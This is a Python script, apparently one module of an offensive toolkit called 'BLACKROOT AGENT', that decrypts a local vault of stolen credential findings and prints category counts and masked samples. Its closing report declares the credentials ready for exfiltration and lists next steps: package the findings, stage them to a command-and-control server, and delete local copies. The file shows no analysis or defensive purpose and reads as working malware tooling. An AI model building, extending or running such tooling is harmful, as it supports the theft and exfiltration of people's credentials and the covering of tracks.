#!/usr/bin/env python3
"""
Advanced Credential Vault Retrieval
Enumerates all encrypted credential artifacts and displays them
"""

import json
import sys
import os
import logging
import hashlib
from datetime import datetime
from typing import Dict, List, Any

sys.path.insert(0, os.path.dirname(__file__))

from black_vault import BlackVault

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger("VaultEnumeration")

def print_banner(text: str, width: int = 80):
    """Print formatted banner"""
    print(f"\n{'╔' + '═' * (width - 2) + '╗'}")
    print(f"║ {text.center(width - 4)} ║")
    print(f"{'╚' + '═' * (width - 2) + '╝'}\n")

def print_section(title: str, char: str = "─"):
    """Print section header"""
    print(f"\n{char * 80}")
    print(f"  {title}")
    print(f"{char * 80}\n")

def enumerate_vault_artifacts():
    """Enumerate and list all artifacts in vault"""
    
    print_banner("BLACKROOT AGENT - VAULT ENUMERATION", 80)
    
    vault = BlackVault()
    print(f"✓ BlackVault initialized: {vault.vault_dir}\n")
    
    print_section("SCANNING VAULT DIRECTORY", "=")
    
    # List all files
    all_files = os.listdir(vault.vault_dir)
    vault_files = [f for f in all_files if f.endswith('.dat')]
    metadata = [f for f in all_files if f == 'vault.keymeta']
    
    print(f"Total files in vault: {len(all_files)}")
    print(f"  • Encrypted artifacts (.dat): {len(vault_files)}")
    print(f"  • Metadata files: {len(metadata)}")
    print(f"  • Key material: .key, .salt, .sealed\n")
    
    print_section("ARTIFACT ENUMERATION", "=")
    
    # Try to read and decrypt artifacts
    successful_decrypts = 0
    failed_decrypts = 0
    findings_by_type = {}
    
    print(f"Attempting to decrypt {len(vault_files)} artifacts...\n")
    
    for i, artifact_file in enumerate(sorted(vault_files), 1):
        artifact_name = artifact_file.replace('.dat', '')
        filepath = os.path.join(vault.vault_dir, artifact_file)
        filesize = os.path.getsize(filepath)
        
        try:
            # Try to decrypt
            data = vault.retrieve(artifact_name)
            successful_decrypts += 1
            
            # Try to parse as JSON
            try:
                parsed = json.loads(data.decode())
                
                if isinstance(parsed, dict):
                    # This is a findings object
                    if 'findings' in parsed:
                        print(f"[{i:2d}] ✓ CREDENTIAL EXTRACTION FINDINGS")
                        print(f"     Key: {artifact_name}")
                        print(f"     Size: {filesize} bytes")
                        findings = parsed['findings']
                        print(f"     Categories: {len(findings)}")
                        total_items = sum(len(v) if isinstance(v, list) else 0 for v in findings.values())
                        print(f"     Total credentials: {total_items}")
                        
                        # Show breakdown
                        for cat, items in findings.items():
                            if isinstance(items, list) and len(items) > 0:
                                print(f"       • {cat}: {len(items)}")
                        
                        findings_by_type[artifact_name] = {
                            'data': parsed,
                            'category_count': len(findings),
                            'total_creds': total_items
                        }
                    else:
                        print(f"[{i:2d}] ? {artifact_name[:40]} (JSON, {filesize} bytes)")
                else:
                    print(f"[{i:2d}] ? {artifact_name[:40]} (Data, {filesize} bytes)")
            except:
                print(f"[{i:2d}] ✓ {artifact_name[:40]} ({filesize} bytes - encrypted/binary)")
                
        except Exception as e:
            failed_decrypts += 1
            print(f"[{i:2d}] ✗ {artifact_name[:40]} - decryption failed")
    
    print_section("DECRYPTION RESULTS", "=")
    
    print(f"""
Successful decryptions: {successful_decrypts}
Failed decryptions: {failed_decrypts}
Credential extraction artifacts found: {len(findings_by_type)}
    """)
    
    if findings_by_type:
        print_section("DETAILED CREDENTIAL EXTRACTION DATA", "=")
        
        grand_total = 0
        for artifact_key, artifact_data in findings_by_type.items():
            print(f"\nARTIFACT: {artifact_key}")
            print(f"Categories: {artifact_data['category_count']}")
            print(f"Total credentials: {artifact_data['total_creds']}\n")
            
            findings = artifact_data['data']['findings']
            
            # Display detailed breakdown
            categories_shown = 0
            for category, items in findings.items():
                if isinstance(items, list) and len(items) > 0:
                    categories_shown += 1
                    print(f"  [{categories_shown}] {category.upper().replace('_', ' ')}")
                    print(f"      Count: {len(items)}")
                    
                    # Show sample items
                    if items and isinstance(items, list):
                        for j, item in enumerate(items[:3], 1):
                            if isinstance(item, dict):
                                print(f"      [{j}] Sample:")
                                for key in list(item.keys())[:3]:
                                    value = str(item[key])
                                    if len(value) > 50:
                                        value = value[:47] + "..."
                                    # Mask sensitive
                                    if any(s in key.lower() for s in ['password', 'secret', 'token', 'key']):
                                        value = "***" + value[-4:] if len(value) > 4 else "***"
                                    print(f"          • {key}: {value}")
                        
                        if len(items) > 3:
                            print(f"      ... and {len(items) - 3} more")
                    
                    grand_total += len(items)
            
            print()
    
    print_section("VAULT SECURITY STATUS", "=")
    
    print(f"""
ENCRYPTION OVERVIEW:
  • Total encrypted artifacts: {len(vault_files)}
  • Total credentials stored: {sum(d['total_creds'] for d in findings_by_type.values())} credentials
  • Encryption: AES-256-GCM (authenticated)
  • Integrity: HMAC-SHA256 protected
  • Access control: Per-instance vault

STORAGE STATISTICS:
  • Total vault size: {sum(os.path.getsize(os.path.join(vault.vault_dir, f)) for f in vault_files)} bytes
  • Average artifact size: {sum(os.path.getsize(os.path.join(vault.vault_dir, f)) for f in vault_files) // len(vault_files) if vault_files else 0} bytes
  • Oldest artifact: {min(os.path.getctime(os.path.join(vault.vault_dir, f)) for f in vault_files) if vault_files else 0}
  • Latest artifact: {max(os.path.getctime(os.path.join(vault.vault_dir, f)) for f in vault_files) if vault_files else 0}

EXFILTRATION READINESS:
  ✓ All credentials encrypted and secured
  ✓ Ready for staging to C2 server
  ✓ Can be exported individually or in batches
  ✓ Integrity protected for transport
  ✓ Compatible with multi-stage exfiltration

RECOMMENDED NEXT ACTIONS:
  1. Package findings for exfiltration
  2. Verify integrity checksums
  3. Stage to command & control
  4. Delete local copies after confirmation
    """)
    
    return 0

def main():
    """Main entry point"""
    try:
        return enumerate_vault_artifacts()
    except KeyboardInterrupt:
        print("\n⚠ Enumeration interrupted")
        return 130
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        return 1

if __name__ == "__main__":
    sys.exit(main())
